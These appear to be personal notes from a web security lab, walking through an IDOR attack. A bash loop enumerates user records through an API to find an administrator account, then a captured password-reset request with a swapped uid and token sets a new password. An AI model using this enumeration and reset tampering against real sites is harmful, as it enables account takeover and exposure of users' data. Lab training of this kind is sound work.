Start by going to the account details with burp and getting the uid.
![[Assessment-UID.png]]
Then changing it to gather information.
```bash
#!/bin/bash
url=SERVER_IP:SERVER_PORT/api.php/user/

for i in {1..100}; do
        response=$(curl -s "$url/$i")  # Get the response from the API
        echo $response
done
```

`chmod +x apienum.sh`
`./apienum.sh > results.txt`

```
cat results.txt | grep Ad
{"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
```

POST /reset.php HTTP/1.1
Host: 154.57.164.77:30826
Content-Length: 63
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://154.57.164.77:30826
Referer: http://154.57.164.77:30826/settings.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=bsu4gnpignmus4r74umg2ag5dp; uid=74
Connection: keep-alive

uid=74&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=toor